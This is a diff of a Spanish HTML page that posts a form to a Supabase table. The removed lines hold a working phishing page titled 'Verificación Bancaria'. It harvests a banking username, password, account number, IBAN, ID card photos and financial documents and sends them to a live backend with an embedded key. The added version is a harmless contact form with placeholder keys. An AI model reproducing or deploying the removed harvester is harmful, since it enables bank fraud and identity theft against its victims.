@@ -2,74 +2,199 @@
 <html lang="es">
 <head>
 <meta charset="UTF-8">
-<title>Verificación Bancaria</title>
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Verificación Digital</title>
+
 <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
+
 <style>
-  body { font-family: Arial; background:#eef2f7; margin:0; padding:0; }
-  h1 { text-align:center; color:#003366; margin-top:25px; }
-  form { max-width:450px; margin:25px auto; background:#fff; padding:25px; border-radius:10px; box-shadow:0 0 10px rgba(0,0,0,0.15); }
-  label { display:block; margin-top:12px; font-weight:bold; }
-  input { width:100%; padding:10px; margin-top:6px; border:1px solid #ccc; border-radius:6px; font-size:15px; }
-  button { margin-top:20px; padding:12px; background:#003366; color:#fff; border:none; border-radius:6px; cursor:pointer; width:100%; font-size:16px; }
+  body {
+    font-family: Arial, sans-serif;
+    background: #eef2f7;
+    margin: 0;
+    padding: 20px;
+  }
+
+  h1 {
+    text-align: center;
+    color: #003366;
+  }
+
+  form {
+    max-width: 450px;
+    margin: 25px auto;
+    background: white;
+    padding: 25px;
+    border-radius: 10px;
+    box-shadow: 0 0 10px rgba(0,0,0,.15);
+  }
+
+  label {
+    display: block;
+    margin-top: 15px;
+    font-weight: bold;
+  }
+
+  input {
+    width: 100%;
+    box-sizing: border-box;
+    padding: 11px;
+    margin-top: 6px;
+    border: 1px solid #ccc;
+    border-radius: 6px;
+    font-size: 15px;
+  }
+
+  button {
+    margin-top: 22px;
+    padding: 13px;
+    background: #003366;
+    color: white;
+    border: none;
+    border-radius: 6px;
+    cursor: pointer;
+    width: 100%;
+    font-size: 16px;
+  }
+
+  button:disabled {
+    background: #888;
+    cursor: not-allowed;
+  }
+
+  #mensaje {
+    max-width: 450px;
+    margin: 15px auto;
+    padding: 12px;
+    border-radius: 6px;
+    text-align: center;
+    display: none;
+  }
+
+  .ok {
+    background: #d9f7df;
+    color: #176b2c;
+  }
+
+  .error {
+    background: #ffdede;
+    color: #9b0000;
+  }
 </style>
 </head>
+
 <body>
 
-<h1>Verificación Bancaria</h1>
+<h1>Verificación Digital</h1>
 
 <form id="form">
-  <label>Usuario:<input type="text" name="usuario" required></label>
-  <label>Contraseña:<input type="password" name="password" required></label>
-  <label>Cuenta bancaria:<input type="text" name="cuenta" required></label>
-  <label>IBAN:<input type="text" name="iban" required></label>
-  <label>Foto carnet (frontal):<input type="file" name="frontal" accept="image/*" required></label>
-  <label>Foto carnet (trasera):<input type="file" name="trasera" accept="image/*" required></label>
-  <label>Comprobante de domicilio:<input type="file" name="domicilio" accept="image/*,application/pdf" required></label>
-  <label>Justificantes financieros:<input type="file" name="finanzas" accept="image/*,application/pdf" required></label>
-  <button type="submit">Guardar verificación</button>
+
+  <label>
+    Nombre
+    <input type="text" name="nombre" required>
+  </label>
+
+  <label>
+    Correo electrónico
+    <input type="email" name="correo" required>
+  </label>
+
+  <label>
+    Teléfono
+    <input type="tel" name="telefono" required>
+  </label>
+
+  <label>
+    Motivo de la verificación
+    <input type="text" name="motivo" required>
+  </label>
+
+  <button type="submit" id="boton">
+    Enviar solicitud
+  </button>
+
 </form>
 
-<script>
-const SUPABASE_URL = "https://iomxopcdoygphvulaswb.supabase.co";
-const SUPABASE_ANON_KEY = "sb_publishable_4KqCEnqLVSEETOob_X9c7w_4IOpToI-";
-const supabase = window.supabase.createClient(SUPABASE_URL, SUPABASE_ANON_KEY);
+<div id="mensaje"></div>
 
-function fileToBase64(file) {
-  return new Promise((resolve, reject) => {
-    const reader = new FileReader();
-    reader.onload = () => resolve(reader.result);
-    reader.onerror = reject;
-    reader.readAsDataURL(file);
-  });
+<script>
+const SUPABASE_URL = "TU_SUPABASE_URL";
+const SUPABASE_ANON_KEY = "TU_SUPABASE_PUBLISHABLE_KEY";
+
+const supabaseClient =
+  window.supabase.createClient(
+    SUPABASE_URL,
+    SUPABASE_ANON_KEY
+  );
+
+const form = document.getElementById("form");
+const boton = document.getElementById("boton");
+const mensaje = document.getElementById("mensaje");
+
+function mostrarMensaje(texto, tipo) {
+  mensaje.textContent = texto;
+  mensaje.className = tipo;
+  mensaje.style.display = "block";
 }
 
-document.getElementById("form").addEventListener("submit", async (e) => {
+form.addEventListener("submit", async function(e) {
+
   e.preventDefault();
-  const f = e.target;
+
+  boton.disabled = true;
+  boton.textContent = "Enviando...";
+
+  mensaje.style.display = "none";
 
   const registro = {
-    usuario: f.usuario.value,
-    password: f.password.value,
-    cuenta: f.cuenta.value,
-    iban: f.iban.value,
-    frontal: await fileToBase64(f.frontal.files[0]),
-    trasera: await fileToBase64(f.trasera.files[0]),
-    domicilio: await fileToBase64(f.domicilio.files[0]),
-    finanzas: await fileToBase64(f.finanzas.files[0]),
+    nombre: form.nombre.value.trim(),
+    correo: form.correo.value.trim(),
+    telefono: form.telefono.value.trim(),
+    motivo: form.motivo.value.trim(),
+    estado: "Pendiente",
     fecha: new Date().toISOString()
   };
 
-  const { error } = await supabase.from("usuario_verificaciones").insert([registro]);
-  if (error) {
-    alert("❌ Error: " + error.message);
-  } else {
-    alert("✔ Verificación guardada correctamente");
-    f.reset();
+  try {
+
+    const { error } = await supabaseClient
+      .from("usuario_verificaciones")
+      .insert([registro]);
+
+    if (error) {
+      console.error(error);
+      mostrarMensaje(
+        "No se pudo enviar la solicitud. Inténtalo nuevamente.",
+        "error"
+      );
+      return;
+    }
+
+    form.reset();
+
+    mostrarMensaje(
+      "Solicitud enviada correctamente. Será revisada por el administrador.",
+      "ok"
+    );
+
+  } catch (error) {
+
+    console.error(error);
+
+    mostrarMensaje(
+      "Ocurrió un error de conexión.",
+      "error"
+    );
+
+  } finally {
+
+    boton.disabled = false;
+    boton.textContent = "Enviar solicitud";
+
   }
+
 });
 </script>
 
-<script src="https://cdn.jsdelivr.net/npm/eruda"></script>
-<script>eruda.init();</script>
 </body>
 </html>
